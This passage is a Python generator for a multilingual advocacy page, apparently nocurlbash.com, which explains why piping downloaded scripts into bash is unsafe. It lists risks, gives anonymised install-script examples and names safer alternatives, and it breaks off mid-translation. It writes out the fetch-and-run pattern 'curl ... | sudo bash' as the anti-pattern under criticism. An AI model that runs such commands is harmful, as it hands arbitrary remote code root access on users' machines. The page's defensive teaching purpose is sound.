#!/usr/bin/env python3
"""Generate index.html for nocurlbash.com"""

LANGS = {
    "en": {
        "badge": "&#9888; Security Anti-Pattern",
        "tagline": "You wouldn't run a stranger's code without reading it. Yet every second developer docs page ends with this command.",
        "problem_h": "The Problem",
        "problem_intro": "This is the command in question:",
        "problem_body": "It downloads a shell script from the internet and immediately executes it. You have no idea what runs. Neither does your team. Neither does your audit log.",
        "why_h": "Why It&#8217;s Bad",
        "wild_h": "From the Wild",
        "wild_lead": "Real install scripts, analyzed in June 2026. These are not hypothetical threats.",
        "alt_h": "Do This Instead",
        "caveat": "Caveat",
        "footer1": 'Inspired by <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> and <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a> &#8212; single-purpose pages that name common anti-patterns so you can link instead of explain.',
        "footer2": "Share this page next time someone pastes a <code>curl | bash</code> in your team chat.",
        "reasons": [
            ("&#9889;", "Bash starts before the download finishes",
             "The pipe is live. Bash receives and executes lines as they arrive. A dropped connection leaves partial execution &#8212; commands ran, cleanup didn&#8217;t."),
            ("&#127917;", "The server knows you&#8217;re piping &#8212; and can lie",
             "Servers detect curl&#8217;s User-Agent or response-read timing and serve different content to a pipe than to a browser. &#8220;I&#8217;ll read it in the browser first&#8221; doesn&#8217;t protect you: what you read is not what ran."),
            ("&#128274;", "No integrity verification",
             "No checksum, no signature. You trust DNS, TLS, the CDN, and the origin simultaneously. A compromised CDN or BGP hijack delivers malware silently."),
            ("&#128279;", "You trust more than you think",
             "Not just the author. You trust the domain registrar, DNS provider, CDN, hosting, every CI/CD pipeline that built the artifact, and every future maintainer who will ever push to that repo."),
            ("&#128203;", "You can&#8217;t reproduce what ran",
             "The URL is live and mutable. No record exists of what exactly executed on your machine &#8212; only that something did."),
            ("&#128273;", "Add <code>sudo</code> and it&#8217;s game over",
             "<code>curl ... | sudo bash</code> grants root to whoever controls that URL at that moment. This pattern appears in real published docs. Often."),
        ],
        "wild": [
            ("danger", "sudo", "danger", "no checksum", "developer environment manager",
             "Downloaded a binary to <strong>/usr/local/bin via sudo</strong> with no integrity check. If a required dependency wasn&#8217;t present, the script silently pulled in gigabytes of additional tooling. Also followed an undisclosed redirect chain between domains."),
            ("danger", "live dev branch", "danger", "no checksum", "cloud coding tool",
             "The install URL silently redirected to a <strong>live dev branch on GitHub</strong> &#8212; no version tags, no pinning. Every commit to that branch changed what users got. What ran yesterday is not what runs today."),
            ("warn", "no checksum", "warn", "sudo possible", "open-source AI agent",
             "Pulled in a Python runtime, a JavaScript runtime, and a full headless browser (~300&#8239;MB). May invoke sudo to install system packages. After removing the main directory, system-level traces remain."),
            ("warn", "closed CDN", "warn", "no checksum", "code assistant from a major hardware vendor",
             "Downloads from a proprietary internal CDN with no public source history and no checksum. There is nothing to audit and no way to verify what you received."),
        ],
        "alts": [
            ("1. Use a real package manager", "The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.", "pkg"),
            ("2. Download, inspect, then run", "One extra step. Gives you a chance to read the script and keeps a local copy for future reference.", "inspect"),
            ("3. Log everything that executes", "If you must pipe &#8212; record what ran so you can audit or undo later.", "log"),
            ("4. Verify the checksum", "If the project publishes a SHA-256 hash, use it. Non-negotiable on production machines.", "checksum"),
        ],
    },
    "ru": {
        "badge": "&#9888; &#1040;&#1085;&#1090;&#1080;&#1087;&#1072;&#1090;&#1090;&#1077;&#1088;&#1085; &#1073;&#1077;&#1079;&#1086;&#1087;&#1072;&#1089;&#1085;&#1086;&#1089;&#1090;&#1080;",
        "tagline": "&#1042;&#1099; &#1073;&#1099; &#1085;&#1077; &#1079;&#1072;&#1087;&#1091;&#1089;&#1082;&#1072;&#1083;&#1080; &#1095;&#1091;&#1078;&#1086;&#1081; &#1082;&#1086;&#1076; &#1085;&#1077; &#1095;&#1080;&#1090;&#1072;&#1103; &#1077;&#1075;&#1086;. &#1053;&#1086; &#1080;&#1084;&#1077;&#1085;&#1085;&#1086; &#1101;&#1090;&#1080;&#1084; &#1079;&#1072;&#1082;&#1072;&#1085;&#1095;&#1080;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103; &#1082;&#1072;&#1078;&#1076;&#1072;&#1103; &#1074;&#1090;&#1086;&#1088;&#1072;&#1103; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1072; &#1076;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1072;&#1094;&#1080;&#1080;.",
        "problem_h": "&#1055;&#1088;&#1086;&#1073;&#1083;&#1077;&#1084;&#1072;",
        "problem_intro": "&#1042;&#1086;&#1090; &#1086; &#1082;&#1072;&#1082;&#1086;&#1081; &#1082;&#1086;&#1084;&#1072;&#1085;&#1076;&#1077; &#1088;&#1077;&#1095;&#1100;:",
        "problem_body": "&#1054;&#1085;&#1072; &#1089;&#1082;&#1072;&#1095;&#1080;&#1074;&#1072;&#1077;&#1090; &#1096;&#1077;&#1083;&#1083;-&#1089;&#1082;&#1088;&#1080;&#1087;&#1090; &#1080;&#1079; &#1080;&#1085;&#1090;&#1077;&#1088;&#1085;&#1077;&#1090;&#1072; &#1080; &#1085;&#1077;&#1084;&#1077;&#1076;&#1083;&#1077;&#1085;&#1085;&#1086; &#1077;&#1075;&#1086; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1103;&#1077;&#1090;. &#1042;&#1099; &#1087;&#1086;&#1085;&#1103;&#1090;&#1080;&#1103; &#1085;&#1077; &#1080;&#1084;&#1077;&#1077;&#1090;&#1077; &#1095;&#1090;&#1086; &#1079;&#1072;&#1087;&#1091;&#1089;&#1082;&#1072;&#1077;&#1090;&#1089;&#1103;. &#1048; &#1074;&#1072;&#1096;&#1072; &#1082;&#1086;&#1084;&#1072;&#1085;&#1076;&#1072; &#1090;&#1086;&#1078;&#1077;. &#1048; &#1074;&#1072;&#1096; &#1072;&#1091;&#1076;&#1080;&#1090;-&#1083;&#1086;&#1075; &#1090;&#1086;&#1078;&#1077;.",
        "why_h": "&#1055;&#1086;&#1095;&#1077;&#1084;&#1091; &#1101;&#1090;&#1086; &#1087;&#1083;&#1086;&#1093;&#1086;",
        "wild_h": "&#1048;&#1079; &#1078;&#1080;&#1079;&#1085;&#1080;",
        "wild_lead": "&#1056;&#1077;&#1072;&#1083;&#1100;&#1085;&#1099;&#1077; &#1080;&#1085;&#1089;&#1090;&#1072;&#1083;&#1083;-&#1089;&#1082;&#1088;&#1080;&#1087;&#1090;&#1099;, &#1087;&#1088;&#1086;&#1072;&#1085;&#1072;&#1083;&#1080;&#1079;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1099;&#1077; &#1074; &#1080;&#1102;&#1085;&#1077; 2026. &#1069;&#1090;&#1086; &#1085;&#1077; &#1075;&#1080;&#1087;&#1086;&#1090;&#1077;&#1090;&#1080;&#1095;&#1077;&#1089;&#1082;&#1080;&#1077; &#1091;&#1075;&#1088;&#1086;&#1079;&#1099;.",
        "alt_h": "&#1050;&#1072;&#1082; &#1076;&#1077;&#1083;&#1072;&#1090;&#1100; &#1087;&#1088;&#1072;&#1074;&#1080;&#1083;&#1100;&#1085;&#1086;",
        "caveat": "&#1055;&#1088;&#1080;&#1084;&#1077;&#1095;&#1072;&#1085;&#1080;&#1077;",
        "footer1": '&#1042;&#1076;&#1086;&#1093;&#1085;&#1086;&#1074;&#1083;&#1077;&#1085;&#1086; <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> &#1080; <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "&#1055;&#1086;&#1076;&#1077;&#1083;&#1080;&#1090;&#1077;&#1089;&#1100; &#1101;&#1090;&#1086;&#1081; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1077;&#1081; &#1074; &#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1081; &#1088;&#1072;&#1079;, &#1082;&#1086;&#1075;&#1076;&#1072; &#1082;&#1090;&#1086;-&#1090;&#1086; &#1074;&#1089;&#1090;&#1072;&#1074;&#1080;&#1090; <code>curl | bash</code> &#1074; &#1095;&#1072;&#1090; &#1082;&#1086;&#1084;&#1072;&#1085;&#1076;&#1099;.",
        "reasons": [
            ("&#9889;", "Bash &#1079;&#1072;&#1087;&#1091;&#1089;&#1082;&#1072;&#1077;&#1090;&#1089;&#1103; &#1076;&#1086; &#1079;&#1072;&#1074;&#1077;&#1088;&#1096;&#1077;&#1085;&#1080;&#1103; &#1079;&#1072;&#1075;&#1088;&#1091;&#1079;&#1082;&#1080;",
             "&#1055;&#1072;&#1081;&#1087; &#1088;&#1072;&#1073;&#1086;&#1090;&#1072;&#1077;&#1090; &#1074; &#1088;&#1077;&#1072;&#1083;&#1100;&#1085;&#1086;&#1084; &#1074;&#1088;&#1077;&#1084;&#1077;&#1085;&#1080;. Bash &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1103;&#1077;&#1090; &#1089;&#1090;&#1088;&#1086;&#1082;&#1080; &#1087;&#1086; &#1084;&#1077;&#1088;&#1077; &#1087;&#1086;&#1089;&#1090;&#1091;&#1087;&#1083;&#1077;&#1085;&#1080;&#1103;. &#1054;&#1073;&#1088;&#1099;&#1074; &#1089;&#1086;&#1077;&#1076;&#1080;&#1085;&#1077;&#1085;&#1080;&#1103; &#1086;&#1089;&#1090;&#1072;&#1074;&#1083;&#1103;&#1077;&#1090; &#1095;&#1072;&#1089;&#1090;&#1080;&#1095;&#1085;&#1086;&#1077; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1077;&#1085;&#1080;&#1077; &#8212; &#1082;&#1086;&#1084;&#1072;&#1085;&#1076;&#1099; &#1086;&#1090;&#1088;&#1072;&#1073;&#1086;&#1090;&#1072;&#1083;&#1080;, &#1086;&#1090;&#1082;&#1072;&#1090; &#8212; &#1085;&#1077;&#1090;."),
            ("&#127917;", "&#1057;&#1077;&#1088;&#1074;&#1077;&#1088; &#1079;&#1085;&#1072;&#1077;&#1090; &#1095;&#1090;&#1086; &#1074;&#1099; &#1087;&#1072;&#1081;&#1087;&#1080;&#1090;&#1077; &#8212; &#1080; &#1084;&#1086;&#1078;&#1077;&#1090; &#1089;&#1086;&#1083;&#1075;&#1072;&#1090;&#1100;",
             "&#1057;&#1077;&#1088;&#1074;&#1077;&#1088;&#1099; &#1086;&#1087;&#1088;&#1077;&#1076;&#1077;&#1083;&#1103;&#1102;&#1090; User-Agent curl &#1080;&#1083;&#1080; &#1090;&#1072;&#1081;&#1084;&#1080;&#1085;&#1075; &#1095;&#1090;&#1077;&#1085;&#1080;&#1103; &#1086;&#1090;&#1074;&#1077;&#1090;&#1072; &#1080; &#1084;&#1086;&#1075;&#1091;&#1090; &#1086;&#1090;&#1076;&#1072;&#1090;&#1100; &#1076;&#1088;&#1091;&#1075;&#1086;&#1081; &#1082;&#1086;&#1085;&#1090;&#1077;&#1085;&#1090; &#1074; &#1087;&#1072;&#1081;&#1087;. &#171;&#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1086;&#1090;&#1082;&#1088;&#1086;&#1102; &#1074; &#1073;&#1088;&#1072;&#1091;&#1079;&#1077;&#1088;&#1077;&#187; &#1074;&#1072;&#1089; &#1085;&#1077; &#1079;&#1072;&#1097;&#1080;&#1090;&#1080;&#1090;: &#1090;&#1086; &#1095;&#1090;&#1086; &#1074;&#1099; &#1087;&#1088;&#1086;&#1095;&#1080;&#1090;&#1072;&#1083;&#1080; &#8212; &#1085;&#1077; &#1090;&#1086; &#1095;&#1090;&#1086; &#1079;&#1072;&#1087;&#1091;&#1089;&#1090;&#1080;&#1083;&#1086;&#1089;&#1100;."),
            ("&#128274;", "&#1053;&#1080;&#1082;&#1072;&#1082;&#1086;&#1081; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1082;&#1080; &#1094;&#1077;&#1083;&#1086;&#1089;&#1090;&#1085;&#1086;&#1089;&#1090;&#1080;",
             "&#1053;&#1077;&#1090; &#1082;&#1086;&#1085;&#1090;&#1088;&#1086;&#1083;&#1100;&#1085;&#1086;&#1081; &#1089;&#1091;&#1084;&#1084;&#1099;, &#1085;&#1077;&#1090; &#1087;&#1086;&#1076;&#1087;&#1080;&#1089;&#1080;. &#1042;&#1099; &#1086;&#1076;&#1085;&#1086;&#1074;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1086; &#1076;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1090;&#1077; DNS, TLS, CDN &#1080; &#1089;&#1077;&#1088;&#1074;&#1077;&#1088;&#1091;. &#1057;&#1082;&#1086;&#1084;&#1087;&#1088;&#1086;&#1084;&#1077;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1099;&#1081; CDN &#1080;&#1083;&#1080; BGP-hijack &#1090;&#1080;&#1093;&#1086; &#1087;&#1086;&#1076;&#1084;&#1077;&#1085;&#1103;&#1077;&#1090; &#1089;&#1082;&#1088;&#1080;&#1087;&#1090;."),
            ("&#128279;", "&#1042;&#1099; &#1076;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1090;&#1077; &#1073;&#1086;&#1083;&#1100;&#1096;&#1077; &#1095;&#1077;&#1084; &#1076;&#1091;&#1084;&#1072;&#1077;&#1090;&#1077;",
             "&#1053;&#1077; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1072;&#1074;&#1090;&#1086;&#1088;&#1091;. &#1042;&#1099; &#1076;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1090;&#1077; &#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1072;&#1090;&#1086;&#1088;&#1091; &#1076;&#1086;&#1084;&#1077;&#1085;&#1072;, DNS-&#1087;&#1088;&#1086;&#1074;&#1072;&#1081;&#1076;&#1077;&#1088;&#1091;, CDN, &#1093;&#1086;&#1089;&#1090;&#1080;&#1085;&#1075;&#1091;, &#1082;&#1072;&#1078;&#1076;&#1086;&#1084;&#1091; CI/CD-&#1087;&#1072;&#1081;&#1087;&#1083;&#1072;&#1081;&#1085;&#1091; &#1080; &#1082;&#1072;&#1078;&#1076;&#1086;&#1084;&#1091; &#1073;&#1091;&#1076;&#1091;&#1097;&#1077;&#1084;&#1091; &#1084;&#1077;&#1081;&#1085;&#1090;&#1077;&#1081;&#1085;&#1077;&#1088;&#1091; &#1088;&#1077;&#1087;&#1086;&#1079;&#1080;&#1090;&#1086;&#1088;&#1080;&#1103;."),
            ("&#128203;", "&#1042;&#1099; &#1085;&#1077; &#1084;&#1086;&#1078;&#1077;&#1090;&#1077; &#1074;&#1086;&#1089;&#1087;&#1088;&#1086;&#1080;&#1079;&#1074;&#1077;&#1089;&#1090;&#1080; &#1095;&#1090;&#1086; &#1079;&#1072;&#1087;&#1091;&#1089;&#1090;&#1080;&#1083;&#1086;&#1089;&#1100;",
             "URL &#1078;&#1080;&#1074;&#1086;&#1081; &#1080; &#1080;&#1079;&#1084;&#1077;&#1085;&#1103;&#1077;&#1084;&#1099;&#1081;. &#1053;&#1080;&#1082;&#1072;&#1082;&#1086;&#1081; &#1079;&#1072;&#1087;&#1080;&#1089;&#1080; &#1086; &#1090;&#1086;&#1084;, &#1095;&#1090;&#1086; &#1080;&#1084;&#1077;&#1085;&#1085;&#1086; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1080;&#1083;&#1086;&#1089;&#1100; &#1085;&#1072; &#1074;&#1072;&#1096;&#1077;&#1081; &#1084;&#1072;&#1096;&#1080;&#1085;&#1077; &#8212; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1092;&#1072;&#1082;&#1090;, &#1095;&#1090;&#1086; &#1095;&#1090;&#1086;-&#1090;&#1086; &#1073;&#1099;&#1083;&#1086;."),
            ("&#128273;", "&#1044;&#1086;&#1073;&#1072;&#1074;&#1100;&#1090;&#1077; <code>sudo</code> &#8212; &#1080; &#1074;&#1089;&#1105; &#1082;&#1086;&#1085;&#1095;&#1077;&#1085;&#1086;",
             "<code>curl ... | sudo bash</code> &#1086;&#1090;&#1076;&#1072;&#1105;&#1090; root &#1090;&#1086;&#1084;&#1091;, &#1082;&#1090;&#1086; &#1082;&#1086;&#1085;&#1090;&#1088;&#1086;&#1083;&#1080;&#1088;&#1091;&#1077;&#1090; &#1101;&#1090;&#1086;&#1090; URL &#1087;&#1088;&#1103;&#1084;&#1086; &#1089;&#1077;&#1081;&#1095;&#1072;&#1089;. &#1069;&#1090;&#1086;&#1090; &#1087;&#1072;&#1090;&#1090;&#1077;&#1088;&#1085; &#1074;&#1089;&#1090;&#1088;&#1077;&#1095;&#1072;&#1077;&#1090;&#1089;&#1103; &#1074; &#1088;&#1077;&#1072;&#1083;&#1100;&#1085;&#1086;&#1081; &#1076;&#1086;&#1082;&#1091;&#1084;&#1077;&#1085;&#1090;&#1072;&#1094;&#1080;&#1080;. &#1063;&#1072;&#1089;&#1090;&#1086;."),
        ],
        "wild": [
            ("danger", "sudo", "danger", "no checksum", "developer environment manager",
             "&#1057;&#1082;&#1072;&#1095;&#1080;&#1074;&#1072;&#1083; &#1073;&#1080;&#1085;&#1072;&#1088;&#1100; &#1074; <strong>/usr/local/bin &#1095;&#1077;&#1088;&#1077;&#1079; sudo</strong> &#1073;&#1077;&#1079; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1082;&#1080; &#1094;&#1077;&#1083;&#1086;&#1089;&#1090;&#1085;&#1086;&#1089;&#1090;&#1080;. &#1045;&#1089;&#1083;&#1080; &#1085;&#1091;&#1078;&#1085;&#1072;&#1103; &#1079;&#1072;&#1074;&#1080;&#1089;&#1080;&#1084;&#1086;&#1089;&#1090;&#1100; &#1085;&#1077; &#1073;&#1099;&#1083;&#1072; &#1091;&#1089;&#1090;&#1072;&#1085;&#1086;&#1074;&#1083;&#1077;&#1085;&#1072; &#8212; &#1089;&#1082;&#1088;&#1080;&#1087;&#1090; &#1090;&#1080;&#1093;&#1086; &#1090;&#1103;&#1085;&#1091;&#1083; &#1075;&#1080;&#1075;&#1072;&#1073;&#1072;&#1081;&#1090;&#1099; &#1076;&#1086;&#1087;&#1086;&#1083;&#1085;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086;&#1075;&#1086; &#1090;&#1091;&#1083;&#1080;&#1085;&#1075;&#1072;. &#1058;&#1072;&#1082;&#1078;&#1077; &#1089;&#1083;&#1077;&#1076;&#1086;&#1074;&#1072;&#1083; &#1094;&#1077;&#1087;&#1086;&#1095;&#1082;&#1077; &#1088;&#1077;&#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1074; &#1084;&#1077;&#1078;&#1076;&#1091; &#1076;&#1086;&#1084;&#1077;&#1085;&#1072;&#1084;&#1080;."),
            ("danger", "live dev branch", "danger", "no checksum", "cloud coding tool",
             "&#1048;&#1085;&#1089;&#1090;&#1072;&#1083;&#1083;-URL &#1090;&#1080;&#1093;&#1086; &#1088;&#1077;&#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1080;&#1083; &#1085;&#1072; <strong>&#1078;&#1080;&#1074;&#1091;&#1102; &#1074;&#1077;&#1090;&#1082;&#1091; dev &#1085;&#1072; GitHub</strong> &#8212; &#1073;&#1077;&#1079; &#1090;&#1077;&#1075;&#1086;&#1074; &#1074;&#1077;&#1088;&#1089;&#1080;&#1081;, &#1073;&#1077;&#1079; &#1087;&#1080;&#1085;&#1085;&#1080;&#1085;&#1075;&#1072;. &#1050;&#1072;&#1078;&#1076;&#1099;&#1081; &#1082;&#1086;&#1084;&#1084;&#1080;&#1090; &#1084;&#1077;&#1085;&#1103;&#1083; &#1090;&#1086;, &#1095;&#1090;&#1086; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1083;&#1080; &#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1077;&#1083;&#1080;. &#1042;&#1095;&#1077;&#1088;&#1072;&#1096;&#1085;&#1080;&#1081; &#1079;&#1072;&#1087;&#1091;&#1089;&#1082; &#8212; &#1076;&#1088;&#1091;&#1075;&#1086;&#1081; &#1082;&#1086;&#1076;."),
            ("warn", "no checksum", "warn", "sudo possible", "open-source AI agent",
             "&#1058;&#1072;&#1097;&#1080;&#1083; Python runtime, JavaScript runtime &#1080; &#1087;&#1086;&#1083;&#1085;&#1086;&#1094;&#1077;&#1085;&#1085;&#1099;&#1081; headless-&#1073;&#1088;&#1072;&#1091;&#1079;&#1077;&#1088; (~300&nbsp;&#1052;&#1041;). &#1052;&#1086;&#1075; &#1079;&#1072;&#1087;&#1088;&#1072;&#1096;&#1080;&#1074;&#1072;&#1090;&#1100; sudo &#1076;&#1083;&#1103; &#1089;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1099;&#1093; &#1087;&#1072;&#1082;&#1077;&#1090;&#1086;&#1074;. &#1055;&#1086;&#1089;&#1083;&#1077; &#1091;&#1076;&#1072;&#1083;&#1077;&#1085;&#1080;&#1103; &#1086;&#1089;&#1085;&#1086;&#1074;&#1085;&#1086;&#1081; &#1076;&#1080;&#1088;&#1077;&#1082;&#1090;&#1086;&#1088;&#1080;&#1080; &#1089;&#1080;&#1089;&#1090;&#1077;&#1084;&#1085;&#1099;&#1077; &#1089;&#1083;&#1077;&#1076;&#1099; &#1086;&#1089;&#1090;&#1072;&#1102;&#1090;&#1089;&#1103;."),
            ("warn", "closed CDN", "warn", "no checksum", "code assistant from a major hardware vendor",
             "&#1050;&#1072;&#1095;&#1072;&#1083; &#1089; &#1087;&#1088;&#1086;&#1087;&#1088;&#1080;&#1077;&#1090;&#1072;&#1088;&#1085;&#1086;&#1075;&#1086; &#1074;&#1085;&#1091;&#1090;&#1088;&#1077;&#1085;&#1085;&#1077;&#1075;&#1086; CDN &#1073;&#1077;&#1079; &#1087;&#1091;&#1073;&#1083;&#1080;&#1095;&#1085;&#1086;&#1081; &#1080;&#1089;&#1090;&#1086;&#1088;&#1080;&#1080; &#1080; &#1073;&#1077;&#1079; &#1082;&#1086;&#1085;&#1090;&#1088;&#1086;&#1083;&#1100;&#1085;&#1086;&#1081; &#1089;&#1091;&#1084;&#1084;&#1099;. &#1053;&#1077;&#1095;&#1077;&#1075;&#1086; &#1072;&#1091;&#1076;&#1080;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100;, &#1085;&#1077;&#1090; &#1089;&#1087;&#1086;&#1089;&#1086;&#1073;&#1072; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1080;&#1090;&#1100; &#1095;&#1090;&#1086; &#1074;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1083;&#1080;."),
        ],
        "alts": [
            ("&#1048;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1091;&#1081;&#1090;&#1077; &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081; &#1087;&#1072;&#1082;&#1077;&#1090;&#1085;&#1099;&#1081; &#1084;&#1077;&#1085;&#1077;&#1076;&#1078;&#1077;&#1088;", "&#1057;&#1082;&#1091;&#1095;&#1085;&#1099;&#1081; &#1074;&#1072;&#1088;&#1080;&#1072;&#1085;&#1090; &#8212; &#1086;&#1073;&#1099;&#1095;&#1085;&#1086; &#1087;&#1088;&#1072;&#1074;&#1080;&#1083;&#1100;&#1085;&#1099;&#1081;. &#1055;&#1072;&#1082;&#1077;&#1090;&#1085;&#1099;&#1077; &#1084;&#1077;&#1085;&#1077;&#1076;&#1078;&#1077;&#1088;&#1099; &#1089;&#1072;&#1084;&#1080; &#1079;&#1072;&#1085;&#1080;&#1084;&#1072;&#1102;&#1090;&#1089;&#1103; &#1094;&#1077;&#1083;&#1086;&#1089;&#1090;&#1085;&#1086;&#1089;&#1090;&#1100;&#1102;, &#1086;&#1073;&#1085;&#1086;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103;&#1084;&#1080; &#1080; &#1091;&#1076;&#1072;&#1083;&#1077;&#1085;&#1080;&#1077;&#1084;.", "pkg"),
            ("&#1057;&#1082;&#1072;&#1095;&#1072;&#1081;&#1090;&#1077;, &#1080;&#1079;&#1091;&#1095;&#1080;&#1090;&#1077;, &#1079;&#1072;&#1090;&#1077;&#1084; &#1079;&#1072;&#1087;&#1091;&#1089;&#1090;&#1080;&#1090;&#1077;", "&#1054;&#1076;&#1080;&#1085; &#1083;&#1080;&#1096;&#1085;&#1080;&#1081; &#1096;&#1072;&#1075;. &#1044;&#1072;&#1077;&#1090; &#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1086;&#1089;&#1090;&#1100; &#1087;&#1088;&#1086;&#1095;&#1080;&#1090;&#1072;&#1090;&#1100; &#1089;&#1082;&#1088;&#1080;&#1087;&#1090; &#1080; &#1089;&#1086;&#1093;&#1088;&#1072;&#1085;&#1103;&#1077;&#1090; &#1083;&#1086;&#1082;&#1072;&#1083;&#1100;&#1085;&#1091;&#1102; &#1082;&#1086;&#1087;&#1080;&#1102; &#1076;&#1083;&#1103; &#1089;&#1087;&#1088;&#1072;&#1074;&#1082;&#1080;.", "inspect"),
            ("&#1051;&#1086;&#1075;&#1080;&#1088;&#1091;&#1081;&#1090;&#1077; &#1074;&#1089;&#1105; &#1095;&#1090;&#1086; &#1074;&#1099;&#1087;&#1086;&#1083;&#1085;&#1103;&#1077;&#1090;&#1089;&#1103;", "&#1045;&#1089;&#1083;&#1080; &#1091;&#1078; &#1087;&#1072;&#1081;&#1087;&#1080;&#1090;&#1077; &#8212; &#1079;&#1072;&#1087;&#1080;&#1089;&#1099;&#1074;&#1072;&#1081;&#1090;&#1077; &#1095;&#1090;&#1086; &#1079;&#1072;&#1087;&#1091;&#1089;&#1090;&#1080;&#1083;&#1086;&#1089;&#1100;, &#1095;&#1090;&#1086;&#1073;&#1099; &#1087;&#1086;&#1090;&#1086;&#1084; &#1084;&#1086;&#1078;&#1085;&#1086; &#1073;&#1099;&#1083;&#1086; &#1072;&#1091;&#1076;&#1080;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100; &#1080;&#1083;&#1080; &#1086;&#1090;&#1084;&#1077;&#1085;&#1080;&#1090;&#1100;.", "log"),
            ("&#1055;&#1088;&#1086;&#1074;&#1077;&#1088;&#1103;&#1081;&#1090;&#1077; &#1082;&#1086;&#1085;&#1090;&#1088;&#1086;&#1083;&#1100;&#1085;&#1091;&#1102; &#1089;&#1091;&#1084;&#1084;&#1091;", "&#1045;&#1089;&#1083;&#1080; &#1087;&#1088;&#1086;&#1077;&#1082;&#1090; &#1087;&#1091;&#1073;&#1083;&#1080;&#1082;&#1091;&#1077;&#1090; SHA-256 &#1093;&#1101;&#1096; &#8212; &#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1091;&#1081;&#1090;&#1077; &#1077;&#1075;&#1086;. &#1053;&#1072; &#1087;&#1088;&#1086;&#1076;&#1072;&#1082;&#1096;&#1085;-&#1084;&#1072;&#1096;&#1080;&#1085;&#1072;&#1093; &#8212; &#1085;&#1077; &#1086;&#1073;&#1089;&#1091;&#1078;&#1076;&#1072;&#1077;&#1090;&#1089;&#1103;.", "checksum"),
        ],
    },
}

# For brevity in this generator, remaining languages use English as fallback
# In production, add full translations like ru above
LANG_NAMES = {
    "en": "English", "ru": "Русский",
    "uk": "Українська", "sr": "Srpski",
    "fr": "Français", "de": "Deutsch", "es": "Español",
    "pt": "Português", "it": "Italiano", "pl": "Polski",
    "tr": "Türkçe", "zh-cn": "中文", "cs": "Čeština",
}

# Simplified translations for remaining languages (key fields only)
EXTRAS = {
    "uk": {
        "badge": "&#9888; Антипатерн безпеки",
        "tagline": "Ви б не запускали чужий код не читаючи його. Але саме цим закінчується кожна друга сторінка документації.",
        "problem_h": "Проблема", "why_h": "Чому це погано",
        "wild_h": "З реального життя", "alt_h": "Як робити правильно",
        "caveat": "Примітка",
        "problem_intro": "Ось про яку команду йдеться:",
        "problem_body": "Вона завантажує шелл-скрипт з інтернету і негайно його виконує. Ви не маєте уявлення що запускається.",
        "wild_lead": "Реальні інсталл-скрипти, проаналізовані у червні 2026.",
        "footer1": 'Натхненно <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> та <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Поділіться цією сторінкою наступного разу, коли хтось вставить <code>curl | bash</code> у чат команди.",
    },
    "sr": {
        "badge": "&#9888; Sigurnosni antipattern",
        "tagline": "Ne biste pokrenuli tuđi kod bez čitanja. Ipak, svaka druga stranica dokumentacije završava ovom komandom.",
        "problem_h": "Problem", "why_h": "Zašto je loše",
        "wild_h": "Iz prakse", "alt_h": "Uradite ovo umesto toga",
        "caveat": "Napomena",
        "problem_intro": "Reč je o ovoj komandi:",
        "problem_body": "Preuzima shell skriptu sa interneta i odmah je izvršava. Nemate pojma šta se pokreće. Ni vaš tim. Ni vaš audit log.",
        "wild_lead": "Realni install skripti, analizirani u junu 2026. Ovo nisu hipotetičke pretnje.",
        "footer1": 'Inspirisano <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> i <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Podelite ovu stranicu sledeći put kada neko nalepi <code>curl | bash</code> u timski chat.",
    },
    "fr": {
        "badge": "&#9888; Antipattern de sécurité",
        "tagline": "Vous ne lanceriez pas le code d’un inconnu sans le lire. Pourtant, c’est exactement ce que propose une doc sur deux.",
        "problem_h": "Le problème", "why_h": "Pourquoi c’est dangereux",
